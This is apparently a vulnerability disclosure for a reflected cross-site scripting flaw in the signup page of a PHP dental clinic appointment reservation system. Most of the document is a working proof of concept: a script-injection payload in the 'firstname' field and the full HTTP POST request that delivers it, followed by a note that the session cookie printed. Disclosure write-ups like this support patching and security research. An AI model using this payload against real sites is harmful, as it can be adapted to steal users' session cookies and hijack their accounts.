# Dental Clinic Appointment Reservation System v1.0 has Cross-site scripting (reflected)

BUG_Author:niclo

Website source address:https://www.sourcecodester.com/php/6848/appointment-reservation-system.html

Vulnerability File: /APR/signup.php

POST parameter 'firstname' exists XSS vulnerability

Payload:firstname=a"><script>alert(document.cookie)</script>&lastname=b&middlename=c&gender=Male&age=1&username=g&password=h&submit=&address=d&contact_no=e&email=f&code=j&cpassword=h

```
POST /APR/signup.php HTTP/1.1
Host: localhost
Content-Length: 174
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/APR/signup.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=k65tutg8g9o2qq8lc3vsi85rn7
Connection: close

firstname=a"><script>alert(document.cookie)</script>&lastname=b&middlename=c&gender=Male&age=1&username=g&password=h&submit=&address=d&contact_no=e&email=f&code=j&cpassword=h
```

print cookie successfully

![image](https://github.com/nightcloudos/picture/blob/main/cookie.png)
